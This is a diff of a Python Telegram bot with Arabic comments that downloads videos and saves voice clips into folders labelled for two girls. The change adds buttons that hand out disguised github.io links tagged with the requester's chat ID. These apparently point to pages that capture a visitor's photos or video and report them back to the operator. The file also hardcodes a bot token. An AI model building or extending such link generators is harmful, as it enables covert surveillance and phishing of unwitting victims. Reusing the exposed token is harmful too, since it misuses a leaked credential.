@@ -2,24 +2,35 @@ import os
 import json
 import telebot
 from telebot import types
-from PIL import Image, PngImagePlugin
 import threading
 import http.server
 import yt_dlp
+from PIL import Image, PngImagePlugin
 
+# إعدادات البوت
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# المسارات والروابط
 DB_FILE = "/tmp/voice_db.json"
-user_states = {}
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
+VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
+IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
 
+user_states = {}
+user_data = {}
+
+# --- السيرفر الوهمي للنشاط ---
 def run_dummy_server():
     try:
         port = int(os.environ.get("PORT", 8080))
-        server = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
-        server.serve_forever()
+        httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
+        httpd.serve_forever()
     except: pass
 
+threading.Thread(target=run_dummy_server, daemon=True).start()
+
+# --- قاعدة البيانات ---
 def load_db():
     if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
     try:
@@ -31,59 +42,71 @@ def save_db(db):
         with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, indent=4, ensure_ascii=False)
     except: pass
 
-# --- دالة التحميل مع حماية من الانهيار ---
+# --- دالة التحميل الذكية ---
 def download_video_sync(url, chat_id):
     try:
-        ydl_opts = {'format': 'best[ext=mp4]/best', 'outtmpl': f'/tmp/vid_{chat_id}.mp4', 'quiet': True}
+        ydl_opts = {
+            'format': 'best[ext=mp4]/best',
+            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
+            'quiet': True,
+            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+        }
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(url, download=True)
             return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
     except Exception as e: return None, str(e)
 
+# --- القوائم ---
 @bot.message_handler(commands=['start'])
-def start(message):
+def start(m):
     markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
-               types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu"))
-    bot.send_message(message.chat.id, "مرحباً بك يا سيف:", reply_markup=markup)
+    markup.add(
+        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="p_link"),
+        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="v_link"),
+        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="e_link"),
+        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_vid"),
+        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="v_menu")
+    )
+    bot.send_message(m.chat.id, "🤖 أهلاً بك سيف:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_query(call):
-    chat_id = call.message.chat.id
-    if call.data == "dl_video":
-        user_states[chat_id] = "waiting_for_url"
-        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
-    elif call.data == "voice_menu":
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(types.InlineKeyboardButton("الفتاة 1", callback_data="g1"), types.InlineKeyboardButton("الفتاة 2", callback_data="g2"))
-        bot.edit_message_text("اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
-    elif call.data in ["g1", "g2"]:
-        user_states[chat_id] = f"active_{call.data}"
-        bot.answer_callback_query(call.id, "أرسل الفويس الآن ليتم حفظه.")
-    bot.answer_callback_query(call.id)
+@bot.callback_query_handler(func=lambda c: True)
+def query(c):
+    cid = c.message.chat.id
+    if c.data == "dl_vid":
+        user_states[cid] = "dl"
+        bot.edit_message_text("أرسل الرابط:", cid, c.message.message_id)
+    elif c.data == "v_menu":
+        m = types.InlineKeyboardMarkup()
+        m.add(types.InlineKeyboardButton("فتاة 1", callback_data="sel_1"), types.InlineKeyboardButton("فتاة 2", callback_data="sel_2"))
+        bot.edit_message_text("اختر المجلد:", cid, c.message.message_id, reply_markup=m)
+    elif "sel_" in c.data:
+        user_states[cid] = c.data
+        bot.answer_callback_query(c.id, "أرسل الفويس الآن ليحفظ في المجلد")
+    elif c.data in ["p_link", "v_link", "e_link"]:
+        links = {"p_link": PHOTO_PAGE_URL, "v_link": VIDEO_PAGE_URL, "e_link": IMAGE_EDIT_URL}
+        bot.send_message(cid, f"الرابط: {links[c.data]}?chatId={cid}")
+    bot.answer_callback_query(c.id)
 
 @bot.message_handler(content_types=['text', 'voice'])
-def handle_msg(message):
-    chat_id = message.chat.id
-    # معالجة التحميل
-    if user_states.get(chat_id) == "waiting_for_url":
-        status = bot.reply_to(message, "⏳ جاري التحميل...")
-        path, title = download_video_sync(message.text, chat_id)
+def msg(m):
+    cid = m.chat.id
+    # تحميل فيديو
+    if user_states.get(cid) == "dl":
+        s = bot.reply_to(m, "⏳ جاري التحميل...")
+        path, title = download_video_sync(m.text, cid)
         if path:
-            bot.send_video(chat_id, open(path, 'rb'), caption=title)
-            bot.delete_message(chat_id, status.message_id)
+            bot.send_video(cid, open(path, 'rb'), caption=title)
+            bot.delete_message(cid, s.message_id)
             os.remove(path)
-        else: bot.edit_message_text(f"❌ خطأ: {title}", chat_id, status.message_id)
-        user_states[chat_id] = None
-    # معالجة حفظ الصوت
-    elif message.voice and "active_" in str(user_states.get(chat_id)):
+        else: bot.edit_message_text(f"❌ فشل: {title}", cid, s.message_id)
+        user_states[cid] = None
+    # حفظ صوتيات
+    elif m.voice and "sel_" in str(user_states.get(cid)):
         db = load_db()
-        target = "girl_1" if "g1" in user_states[chat_id] else "girl_2"
-        idx = len(db[target]) + 1
-        db[target][f"مقطع {idx}"] = message.voice.file_id
+        key = "girl_1" if "sel_1" in user_states[cid] else "girl_2"
+        idx = len(db[key]) + 1
+        db[key][f"مقطع {idx}"] = m.voice.file_id
         save_db(db)
-        bot.reply_to(message, "✅ تم الحفظ بنجاح.")
+        bot.reply_to(m, f"✅ تم حفظ مقطع {idx} في {key}")
 
-if __name__ == '__main__':
-    threading.Thread(target=run_dummy_server, daemon=True).start()
-    bot.polling(none_stop=True)
+bot.polling(none_stop=True)
